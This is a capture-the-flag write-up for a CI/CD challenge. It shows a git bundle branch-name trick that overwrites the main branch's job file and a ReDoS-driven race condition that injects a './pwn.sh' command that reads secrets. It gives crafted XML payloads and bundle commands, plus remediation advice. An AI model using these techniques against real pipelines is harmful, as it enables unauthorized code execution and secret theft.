#NautilusInstituteContinuousIntegrationAndContinuousDelivery
## Summary
This challenge uses git shannagins to allow us to overwrite the main branch of a remote repository, allowing us to run run unintended CICD jobs. The second part uses this, as well as a race condition to run arbitrary code on the server.

**Artifacts:**
* `Readme.md`: The writeup file
* `solve.py`: The python script that connects to the server and sends the git bundle
* `dist.tar.gz`: The zipped up challenge code
   * `dist/run.sh`: The script that runs the server
    * `dist/nicicd`: The directory where the server code is
      * `dist/nicicd/server.py`: The server code, which runs the elixer script
      * `dist/nicicd/common_jobs`: The directory where the job definitions are
        * `flaguno.xml`: The job that prints the first flag
        * `release.xml`: The job used for the second flag
      * `dist/nicicd/process_git_repo.exs`: The elixer script that processes the git bundle and runs the jobs
      * `dist/nicicd/process_git_repo_tracing.exs`: The elixer script with tracing added to it (NOT PART OF THE ORIGINAL CHALLENGE)
* `git_attack.tar.gz`: The directory where we create the git bundle and run the exploit, ziped to avoid git freaking out
  * `git_attack/exp1.bundle`: The git bundle for the first flag, has a corosponding directory
  * `git_attack/exp2.bundle`: The git bundle for the second flag, has a corosponding directory
* `Dockerfile`: for elixer debugging purposes


## Context
When we connect to the server, we are asked to pass in the length of the git bundle we want to send in bytes, then asked to send the bundle itself.

Digging into the zipped code we are given, we can see a couple of things. In the top level directory, we have a dockerfile, and some bash scripts that just run the server. Those call run_challenge.sh, which in turn runs the python file server.py.

This is the spot where actually interesting logic is happening. We can see that in the main function, we are calling `accept_pull_request`, then `run_cicd`.

The first of these functions gets a git bundle from the user, depositing it at the specified path.

The second runs a .exs script, which is a elixir script, on the bundle. (The commented code is for tracing the thing so we can see what it is actually doing.)

Finally, the server is checkingg the status of the jobs, and exiting.

So the vurnability likely lies in the elixer script, and how it is handling the git bundle.

In broad strokes, this file is loading some job definitions from a jobs file, calling a function called process_git_repo_and_actor_plan, which seems to be the function that actually extracts the git bundle, and runs all of the jobs.

We can see the jobs in the common_jobs dir, and a juicy one seems like flaguno.xml, which just prints the first flag.

The trick is getting that to run. The actual elixer function is all in obsfucated erl bytecode, so either blackbox testing or reverse engineering will be needed to figure out what is going on.


### Aside about git bundles
Before diving into more about this challenge, it is useful to know what git bundles are and what information they contain. A git bundle is essentially a single file (`.bundle`) that acts like a portable Git repository. It packages up Git objects (commits, trees, blobs) and references (like branches or tags) needed to reconstruct a part of the repository's history. They are often used to transfer Git data when direct network access between repositories isn't available or desired, which is exactly how this challenge uses them to simulate receiving a pull request. The server treats the uploaded bundle file as a remote repository to fetch from.

To create one, you can use the command `git bundle create <filename> <refspec>`, where `<filename>` is the name of the bundle file and `<refspec>` specifies what to include in the bundle. For our purposes, refspec will always be some branch or branches like `target main.`

### Figuring out the elixir code

I found a combination of two things to be useful for this. The first was running the challenge locally with the provided code, but adding in elixer debug tracing to see function calls and their returns. The second was using strace when calling that elixer script so that it would dump all of the calls it was making, which was critical for figureing out exactly what git commander were running, and what they were returning.

The decompiler proved to be almost completly useless, as it revealed no actual information ab out what the functions were actually doing.


By using this debugging, we can discover that the server is attempting to add our git bundle as a remote repository, fetch from it. It then pulls out the target branch (defined as the first refrence in the bundle), switches to it, pulls it from the origin (the bundle) into a local branch.

It then switches back to main, grabs the `actor.x` file which defines the jobs to run, switches to the target branch, and runs the jobs.

The order of these git commands is laid out below.
```bash
#!/bin/bash
echo "Running git init..."
git init

git remote remove origin

git remote add origin /tmp/pull-request.bundle

git fetch origin

git switch -C target

git pull origin target

git switch main
# Finding which jobs to run
git switch target
# Running the jobs
```

### Race condition hunting

During the challenge itself, I was not close to finding this second vurnability, but in retrospect, this is how you could find it or predict it.

Each job defines a bash script with dynamic inputs based on the job name. For example, we can look at the release job
```xml
<?xml version="1.0" encoding="UTF-8"?>
<job>
  <name>release</name>
  <script>
#!/bin/bash
echo 'Releasing {%= app_name %}'

tar -czhf '/releases/{%= release_name %}.tar.gz' $REPO_ROOT || sleep 5
echo "release" | tee /pr-status/status

echo "all done"
  </script>
  <env>
    <var name="ENVIRONMENT">production</var>
  </env>
  <input name="app_name" />
  <input name="release_name" />
</job> 
```

Every time the job is called, an actual bash script is created from this xml definition on the disk. This could be a problem, as it means that there could be a race condition if we run two jobs with the same name at the same time.



## Vulnerability

### Vuln 1
The order of operations above is heavealy obscured by the elixer code, but once you see it, the problem becomes fairly clear. Git pull with a specific target will pull into the branch you are currently on. So, if we can the git switch before it fail, we can fully define the main branch, and get to run any job we want (from the jobs file, getting arbitrary code execution comes a bit harder.)

It is worth noting that the code does check for some things, like if your first branch is called main, it will not use it and will throw an error. Addationally, if the first refrence is just the HEAD refrence, it will also throw an error.

That still leaves us with a couple of options for what to push. Some of them require editing the binary of the bundle file, but the best one in my opinion is calling a branch main/aa.

When git sets up its refrence structure, it does so in files. For example, if you are building a lot of feature branches, you might want to have them all group together, for example `feature/branch1`, `feature/branch2`, etc. When git sees this, it actually creates a directory structure in the `.git/refs/heads` directory, so there will be a feature folder, and inside that will be the branch files.

The main branch is a file in the `.git/refs/heads`. If we create a branch called `main/aa`, git tries to store that in the main folder. But it cant create the main folder, because the main file already exists.

So, if main/aa correctly exists in the bundle, it cant be pulled into the main branch and switched to, but it can be fetched and the pull will still work, just pulling into the main branch.

### Vuln 2
The second vurnability (and set of quirks required to exploit) comes in the form of a race condition when jobs are read in and being run.

When the server runs a job called `release`, it is creating a bash script on disk which is primarly defined by the uncontrollable job xml file, but with some inputs that we can pass in (app name and release name.) It is actually writing this script to a hardcoded place on the disk, which is indicated by the strace:
```
[pid   106] execve("/usr/bin/bash", ["bash", "/ci/jobs/release/build.sh"], 0x55ad7d4926a0 /* 13 vars */) = 0
```

We want this bash script to include something that we want, like `./exp.sh` that would make the job run a script that we fully control.

To do this, we need to set up the race condition. We need two of the same type of job to run. We need one of the jobs to run part of the script from its own job, then part from the other job, because the transition in the middle is how we will escape the quotes and command around the release name (they do preform checks for those escapes).

```
#!/bin/bash
echo 'Releasing {%= app_name %}'

tar -czhf '/releases/{%= release_name %}.tar.gz' $REPO_ROOT || sleep 5 # FIRST SCRIPT SHOULD HANG HERE
echo "release" | tee /pr-status/status

echo "all done"
```

Then we should use a longer release name for the second script such that when the second script smashes the first one, it will run some part of the release name as a command.

To do this, we need the first to hang on the sleep 5, which is simple, we just make tar crash. The second is that we need the second job to run AFTER the first job has started, so we need it to hang before it even writes the script.

Exploring the dissassembled code some more, we can come accros some interesting things.

int the `Elixir.NautilusInstituteContinuousIntegrationAndContinuousDelivery.GitRepo.beam` file, there are a couple things that suggest that there is regix being done on data we can control (see the whole file in `GitRepo_disasm.txt`):
`{:move, {:literal, "censor-regex"}, {:x, 1}}`


`{:move, {:literal, ~r/(password|secret|token)[^\s]*/}, {:x, 1}}`

The suggests that regex is being used, and censor-regex is further being used to censor the output of the job, and we can pass very slow regex in to slow down the begining of this process.

Using a combination of these things, we can use the race condition to make the job run a script that we control.

We also have to add in that script, and there is a secrets binary on the remote server that will read the secrets.

This binary was not provided during the challenge, but its existance was indicated, and it does provide helpful tips on now to use it to read flags.
## Exploitation
**Exploit overview**: This exploit uses a misconfigured CICD pipeline to allow us to change the configuration settings of that pipeline, allowing us to run arbitrary jobs on the server. This requires two steps. We need two of 

**Input restrictions**:
We have to send a git bundle, and since normal git operations are being used, it should be a valid git bundle.

**Exploit Description**: 

### Flag 1
We have to create a git bundle that has a branch called main/aa. This branch should have a modified `actor.x` file that will run the flag job. 

Once we change `actor.x` to say something like this:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<actor fail_fast="true">
  <job name="flaguno">
    <input name="app_name">todo-list</input>
  </job>
</actor> 
```

We then run the following command to create the bundle (run from the app dir, within the git_attack dir):
```bash
git add .
git commit -m "exploit"
git branch -M main/aa
git bundle create ../exp.bundle main/aa
```

This will create a bundle called exp.bundle in the parent directory. 

From here, we can run the solve script, which will connect to the server and send the bundle.
```python
python3 solve.py
```

Doing this against our test enviroment, we get the following output:
```
14:53:58.168 [info] Job flaguno completed with status: 0
Job flaguno completed.

14:53:58.168 [info] flug{placeholder_flag1_____its_pretty_long:edee0fe3e6a80c34ef49a77ef9b11673f675c438e22e1c1eef982fb4082c
2aeab164569a672f67c64c059b872a}
```
### Flag 2
This break is a bit more complex, it requires to exploit that race condition to run a script that we control.

To do this, we first need the command to make tar fail. This is pretty simple, you can just go into the src directory of the repo we are bundling, and run `ln -s mylink mylink`. This creates a synlink mylink that points to itself, which tar will freak out on and fail.

The second is to put really slow regex into the regix tags, for example, you can use this as the second release job:
```
<job name="release">
    <input name="app_name">my-git-application-v2-aaaabaaacaaadaaaeaaafaaagaaah0123456789a123456789b12./pwn.sh #3456789d1234567aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa #</input>
    <input name="release_name">a</input>
    <input name="deploy_commands">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</input>
    <input name="censor-regex">a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</input>
</job>
```
This will make the regex take a long time to run, and will slow down the job creation process.

This sets up our race condition, so with the full actor file, the first script is running:
```
#!/bin/bash
echo 'Releasing {%= app_name %}'

tar -czhf '/releases/a.tar.gz' $REPO_ROOT || sleep 5
./pwn.sh #3456789d1234567aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa #
echo "release" | tee /pr-status/status

echo "all done"
```
Where that middle line that runs our script is there because of the race condition between the two threads.

The final step is just to create that pwn.sh script and put it in the right place. This is a simple bash script that will run the secrets binary, and print out the flag.

```bash
#!/bin/bash
secrets access flag2
```

We can create the git bundle in the same way, and watch the second flag come in!

## Remediation

The simplest way to fix this is to not allow the rest of the script to run if the git switch fails. This will prevent us from pulling into the main branch, so we cant control the actor.x file and cant run our own jobs.

That said, CICD pipelines like this are very hard to secure, and against this challenge, there exists a variaty of problems, including the fact that elixer looks in the current directory for imports before going to the system path, so if you provide, for example, a timer module, it will use that instead of the system one and give another route to RCE.

Because of the inherent difficulty, running these pipelines should only be done in a ephemeral enviroment that can write out the results of the jobs before destroying itself, and does not in itself contain any sensitive information.

## Configuration Notes

This ones a doozy. To run the challenge, you need to unzip the challenge with `tar -xf dist.tar.gz`

Then, from the dist directory, run `./run.sh` which will build and run the dockerfile, listening on port 5555.

To run the solve script, run `python3 solve.py git_attack/exp1.bundle` from the root of the repo for the first flag, and `python3 solve.py git_attack/exp2.bundle` for the second flag.

If you want to see tracing, go into the `server.py` file in the nicicd dirctrory, and change, in the run_cicd function:
```python
    subprocess.call([
        'elixir',
        '--erl','+Bi',
        '/nicicd/process_git_repo.exs',
        path
    ])
    # subprocess.call([
    #     'strace', '-f', '-e', 'trace=process', # Added strace command and flags
    #     'elixir',
    #     '--erl','+Bi',
    #     '/nicicd/process_git_repo_tracing.exs',
    #     path
    # ])
```
to 
```python
    # subprocess.call([
    #     'elixir',
    #     '--erl','+Bi',
    #     '/nicicd/process_git_repo.exs',
    #     path
    # ])
    subprocess.call([
        'strace', '-f', '-e', 'trace=process', # Added strace command and flags
        'elixir',
        '--erl','+Bi',
        '/nicicd/process_git_repo_tracing.exs',
        path
    ])
```
and run ./run.sh again. This will give you a lot of output, but it is very useful for figuring out what the elixer code is doing.
## References

The official writeup, at https://github.com/sergiogarciasec/defcon-nautilus-quals-2025/tree/main/NautilusInstituteContinuousIntegrationAndContinuousDelivery was used as a refrence for this solve.